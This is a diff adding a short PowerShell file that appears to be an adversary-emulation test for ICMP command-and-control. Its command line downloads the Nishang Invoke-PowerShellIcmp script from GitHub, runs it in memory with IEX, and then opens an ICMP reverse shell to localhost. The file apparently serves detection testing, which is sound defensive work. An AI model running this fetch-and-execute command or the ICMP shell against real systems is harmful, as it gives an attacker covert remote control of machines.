@@ -1,0 +1,9 @@
+#TechniqueName: Non-Application Layer Protocol
+#AtomicTestName: ICMP C2
+#Description: This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener&refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/&
+#Language: ps1
+
+#commands
+IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
+Invoke-PowerShellIcmp -IPAddress 127.0.0.1
+
